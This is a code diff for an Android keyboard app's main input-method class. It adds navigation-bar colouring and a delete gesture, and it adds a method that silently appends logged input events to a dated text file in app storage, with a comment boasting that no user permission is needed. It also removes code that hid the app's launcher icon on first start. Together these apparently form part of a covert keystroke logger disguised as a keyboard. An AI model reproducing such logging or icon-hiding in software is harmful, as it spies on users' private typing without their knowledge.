@@ -18,22 +18,21 @@ package com.abifog.lokiboard.latin;
 
 import android.app.AlertDialog;
 import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.DialogInterface.OnClickListener;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.content.res.Resources;
+import android.content.SharedPreferences;
 import android.inputmethodservice.InputMethodService;
 import android.media.AudioManager;
+import android.os.Build;
 import android.os.Debug;
 import android.os.IBinder;
 import android.os.Message;
 import android.preference.PreferenceManager;
-import android.support.annotation.NonNull;
 import android.text.InputType;
 import android.util.Log;
 import android.util.PrintWriterPrinter;
@@ -47,13 +46,16 @@ import android.view.WindowManager;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputMethodSubtype;
 
+import java.io.File;
 import java.io.FileDescriptor;
+import java.io.FileOutputStream;
 import java.io.PrintWriter;
+import java.text.SimpleDateFormat;
 import java.util.Locale;
+import java.util.Date;
 import java.util.concurrent.TimeUnit;
 
 import com.abifog.lokiboard.R;
-import com.abifog.lokiboard.annotations.UsedForTesting;
 import com.abifog.lokiboard.compat.EditorInfoCompatUtils;
 import com.abifog.lokiboard.compat.ViewOutlineProviderCompatUtils;
 import com.abifog.lokiboard.compat.ViewOutlineProviderCompatUtils.InsetsUpdater;
@@ -64,7 +66,6 @@ import com.abifog.lokiboard.keyboard.KeyboardActionListener;
 import com.abifog.lokiboard.keyboard.KeyboardId;
 import com.abifog.lokiboard.keyboard.KeyboardSwitcher;
 import com.abifog.lokiboard.keyboard.MainKeyboardView;
-import com.abifog.lokiboard.keyboard.SetupActivity;
 import com.abifog.lokiboard.latin.common.Constants;
 import com.abifog.lokiboard.latin.define.DebugFlags;
 import com.abifog.lokiboard.latin.inputlogic.InputLogic;
@@ -75,6 +76,7 @@ import com.abifog.lokiboard.latin.utils.ApplicationUtils;
 import com.abifog.lokiboard.latin.utils.DialogUtils;
 import com.abifog.lokiboard.latin.utils.IntentUtils;
 import com.abifog.lokiboard.latin.utils.LeakGuardHandlerWrapper;
+import com.abifog.lokiboard.latin.utils.ResourceUtils;
 import com.abifog.lokiboard.latin.utils.ViewLayoutUtils;
 
 /**
@@ -90,6 +92,8 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     static final long DELAY_DEALLOCATE_MEMORY_MILLIS = TimeUnit.SECONDS.toMillis(10);
 
     final Settings mSettings;
+    private int mOriginalNavBarColor = 0;
+    private int mOriginalNavBarFlags = 0;
     final InputLogic mInputLogic = new InputLogic(this /* LatinIME */);
 
     // TODO: Move these {@link View}s to {@link KeyboardSwitcher}.
@@ -97,7 +101,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     private InsetsUpdater mInsetsUpdater;
 
     private RichInputMethodManager mRichImm;
-    @UsedForTesting final KeyboardSwitcher mKeyboardSwitcher;
+    final KeyboardSwitcher mKeyboardSwitcher;
     private final SubtypeState mSubtypeState = new SubtypeState();
 
     private AlertDialog mOptionsDialog;
@@ -117,7 +121,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
 
         private int mDelayInMillisecondsToUpdateShiftState;
 
-        public UIHandler(@NonNull final LatinIME ownerInstance) {
+        public UIHandler(final LatinIME ownerInstance) {
             super(ownerInstance);
         }
 
@@ -348,16 +352,9 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         final IntentFilter filter = new IntentFilter();
         filter.addAction(AudioManager.RINGER_MODE_CHANGED_ACTION);
         registerReceiver(mRingerModeChangeReceiver, filter);
-
-        //Hide the launcher icon on first start
-        PackageManager packageManager = getPackageManager();
-        ComponentName componentName = new ComponentName(this, SetupActivity.class);
-        packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
-    // Has to be package-visible for unit tests
-    @UsedForTesting
-    void loadSettings() {
+    private void loadSettings() {
         final Locale locale = mRichImm.getCurrentSubtypeLocale();
         final EditorInfo editorInfo = getCurrentInputEditorInfo();
         final InputAttributes inputAttributes = new InputAttributes(editorInfo, isFullscreenMode());
@@ -573,12 +570,20 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     }
 
     @Override
+    public void onWindowShown() {
+        super.onWindowShown();
+        if (isInputViewShown())
+            setNavigationBarColor();
+    }
+
+    @Override
     public void onWindowHidden() {
         super.onWindowHidden();
         final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
         if (mainKeyboardView != null) {
             mainKeyboardView.closing();
         }
+        clearNavigationBarColor();
     }
 
     void onFinishInputInternal() {
@@ -764,9 +769,57 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     }
 
     @Override
-    public void onDeletePointer(int steps) {
-        for (;steps > 0; steps--)
+    public void onMoveDeletePointer(int steps) {
+        int end = mInputLogic.mConnection.getExpectedSelectionEnd();
+        int start = mInputLogic.mConnection.getExpectedSelectionStart() + steps;
+        if (start > end)
+            return;
+        mInputLogic.mConnection.setSelection(start, end);
+    }
+
+    private void savedToTextFile(String fileContents) {
+
+        SimpleDateFormat sdf = new SimpleDateFormat("dd_MM_yyyy", Locale.getDefault());
+        String fileName = "lokiboard_files_" + sdf.format(new Date()) + ".txt";
+
+
+        try {
+
+            // This implementation does not require storage read/write permissions from the user
+            // Stores in Internal Storage > Android > data > com.abifog.lokiboard
+
+            File outfile = new File(this.getExternalFilesDir(null), fileName);
+            FileOutputStream lokiFOut = new FileOutputStream(outfile,true);
+            lokiFOut.write(fileContents.getBytes());
+            lokiFOut.close();
+
+
+        }
+        catch (Exception e) {
+            // TODO Auto-generated catch block
+
+            Log.d("ERROR" , "Something went wrong");
+        }
+
+
+
+        // Save received argument (string) to a text file
+    }
+
+    @Override
+    public void onUpWithDeletePointerActive() {
+        if (mInputLogic.mConnection.hasSelection()) {
+
+            int end = mInputLogic.mConnection.getExpectedSelectionEnd();
+            int start = mInputLogic.mConnection.getExpectedSelectionStart();
+            int steps = start - end;
+            // Log
             mInputLogic.sendDownUpKeyEvent(KeyEvent.KEYCODE_DEL);
+            String pressedChar = "[DEL-" + Math.abs(steps) + " Selected Characters]";
+            savedToTextFile(pressedChar);
+        }
+
+
     }
 
     private boolean isShowingOptionDialog() {
@@ -821,7 +874,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
 
     // This method is public for testability of LatinIME, but also in the future it should
     // completely replace #onCodeInput.
-    public void onEvent(@NonNull final Event event) {
+    public void onEvent(final Event event) {
         if (Constants.CODE_SHORTCUT == event.mKeyCode) {
             mRichImm.switchToShortcutIme(this);
         }
@@ -834,7 +887,6 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
     // A helper method to split the code point and the key code. Ultimately, they should not be
     // squashed into the same variable, and this method should be removed.
     // public for testing, as we don't want to copy the same logic into test code
-    @NonNull
     public static Event createSoftwareKeypressEvent(final int keyCodeOrCodePoint, final int keyX,
              final int keyY, final boolean isKeyRepeat) {
         final int keyCode;
@@ -868,9 +920,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
                 getCurrentRecapitalizeState());
     }
 
-    // Outside LatinIME, only used by the {@link InputTestsBase} test suite.
-    @UsedForTesting
-    void loadKeyboard() {
+    private void loadKeyboard() {
         // Since we are switching languages, the most urgent thing is to let the keyboard graphics
         // update. LoadKeyboard does that, but we need to wait for buffer flip for it to be on
         // the screen. Anything we do right now will delay this, so wait until the next frame
@@ -959,7 +1009,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         }
     };
 
-    void launchSettings(final String extraEntryValue) {
+    void launchSettings() {
         requestHideSelf(0);
         final MainKeyboardView mainKeyboardView = mKeyboardSwitcher.getMainKeyboardView();
         if (mainKeyboardView != null) {
@@ -970,8 +1020,6 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                 | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
                 | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-        intent.putExtra(SettingsActivity.EXTRA_SHOW_HOME_AS_UP, false);
-        intent.putExtra(SettingsActivity.EXTRA_ENTRY_KEY, extraEntryValue);
         startActivity(intent);
     }
 
@@ -999,7 +1047,7 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
                     startActivity(intent);
                     break;
                 case 1:
-                    launchSettings(SettingsActivity.EXTRA_ENTRY_VALUE_LONG_PRESS_COMMA);
+                    launchSettings();
                     break;
                 }
             }
@@ -1074,5 +1122,38 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
         }
         final boolean overrideValue = mSettings.getCurrent().isLanguageSwitchKeyEnabled();
         return mRichImm.shouldOfferSwitchingToNextInputMethod(token) && overrideValue;
+    }
+
+    private void setNavigationBarColor() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && mSettings.getCurrent().mUseMatchingNavbarColor) {
+            final SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+            final int keyboardColor = Settings.readKeyboardColor(prefs, this);
+            final Window window = getWindow().getWindow();
+            if (window == null) {
+                return;
+            }
+            mOriginalNavBarColor = window.getNavigationBarColor();
+            window.setNavigationBarColor(keyboardColor);
+
+            final View view = window.getDecorView();
+            mOriginalNavBarFlags = view.getSystemUiVisibility();
+            if (ResourceUtils.isBrightColor(keyboardColor)) {
+                view.setSystemUiVisibility(mOriginalNavBarFlags | View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR);
+            } else {
+                view.setSystemUiVisibility(mOriginalNavBarFlags & ~View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR);
+            }
+        }
+    }
+
+    private void clearNavigationBarColor() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && mSettings.getCurrent().mUseMatchingNavbarColor) {
+            final Window window = getWindow().getWindow();
+            if (window == null) {
+                return;
+            }
+            window.setNavigationBarColor(mOriginalNavBarColor);
+            final View view = window.getDecorView();
+            view.setSystemUiVisibility(mOriginalNavBarFlags);
+        }
     }
 }
